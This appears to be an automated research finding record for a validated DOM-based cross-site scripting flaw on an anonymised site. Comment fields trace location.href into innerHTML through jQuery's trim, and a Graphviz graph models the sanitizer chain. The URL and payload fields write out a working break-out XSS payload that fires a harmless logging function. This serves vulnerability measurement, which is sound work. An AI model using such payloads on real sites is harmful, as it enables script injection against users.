// Finding: 8c02a7da-bd25-48d2-a3dc-a6c0093c8ce9
// Finding.url: https://www.example289.com/home/tudor-style##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('6a8b342981184c70a2d759bf259817d5')><!--/*
// Finding.parentloc: https://www.example289.com/home/tudor-style##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('6a8b342981184c70a2d759bf259817d5')><!--/*
// Finding.domain: www.example289.com
// Finding.base_domain: example289.com
// Finding.source: location.href
// Finding.sink: innerHTML
// Sanitizer.score: 2
// Sanitizer.name: trim
// Sanitizer.location: https://www.example289.com/z-lib/js/jquery/jquery.min.js - trim:1:3157
// Finding.begin: 97
// Finding.end: 177
// Finding.original_uuid: ad9efc74-a127-4824-a461-53dcdbae31f4
// Finding.TwentyFiveMillionFlowsId: 1822852418
// Finding.script: https://www.example289.com/z-lib/js/jquery/jquery.min.js
// Finding.line: 1
// Exploit.uuid: 6a8b3429-8118-4c70-a2d7-59bf259817d5
// Exploit.success: true
// Exploit.status: validated
// Exploit.method: C
// Exploit.type: html
// Exploit.token: attribute
// Exploit.content: href
// Exploit.quote_type: "
// Exploit.tag: a
// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
// Exploit.break_in: ><!--/*
// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
// Exploit.begin_taint_url: 0
// Exploit.end_taint_url: 6
// Exploit.replace_begin_url: 39
// Exploit.replace_end_url: 39
// Exploit.replace_begin_param: 15
// Exploit.replace_end_param: 15
// Issues.LargestEncodeAttrStringChain: 0
// Issues.LargestTextFragmentEncodeChainLength: 0
// Issues.HasApproximation: false
// Issues.HasMissingImplementation: false
// Issues.HasInfiniteRegexWithFunctionReplacer: false
// Issues.MergedSplitAndJoins: true
// Issues.HasUrlInRhsOfReplace: false
// Issues.HasUrlInLhsOfReplace: false
// Issues.HasCookieValueInLhsOfreplace: false
// Issues.HasCookieValueInRhsOfreplace: false
// Issues.HasCookieValueInMatchPattern: false
// Issues.HasCookieValueInExecPattern: false
// Issues.RemovedLRConcats: false
// Issues.RemovedReplaceArtifacts: false
// Issues.HasUrlInMatchPattern: false
// Issues.HasUrlInExecPattern: false
// Issues.RemovedNOPreplaces: false
// Issues.Known_sanitizer: false
// DepGraph.hash: -1290127923
// DepGraph.sanitizer_hash: 701000130
// Merged split and join statements 
digraph cfg {
n0 [shape=house, label="Input: x"];
n1 [shape=ellipse, label="preg_replace"];
n2 [shape=box, label="RegExp: /\//"];
n3 [shape=box, label="Lit: /"];
n4 [shape=box, label="Var: x"];
n5 [shape=ellipse, label="."];
n6 [shape=box, label="Lit: /"];
n7 [shape=ellipse, label="."];
n8 [shape=box, label="Lit: 3"];
n9 [shape=ellipse, label="."];
n10 [shape=box, label="Lit: <a href=""];
n11 [shape=ellipse, label="."];
n12 [shape=box, label="Lit: " class="z-link-no-style"></a>"];
n13 [shape=ellipse, label="preg_replace"];
n14 [shape=box, label="RegExp: /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/"];
n15 [shape=box, label="Lit: "];
n16 [shape=box, label="Var: x"];
n17 [shape=box, label="Var: x"];
n18 [shape=doubleoctagon, label="Return: x"];
n4 -> n0;
n1 -> n2;
n1 -> n3;
n1 -> n4;
n5 -> n1;
n5 -> n6;
n7 -> n5;
n7 -> n8;
n9 -> n10;
n9 -> n7;
n11 -> n9;
n11 -> n12;
n16 -> n11;
n13 -> n14;
n13 -> n15;
n13 -> n16;
n17 -> n13;
n18 -> n17;
}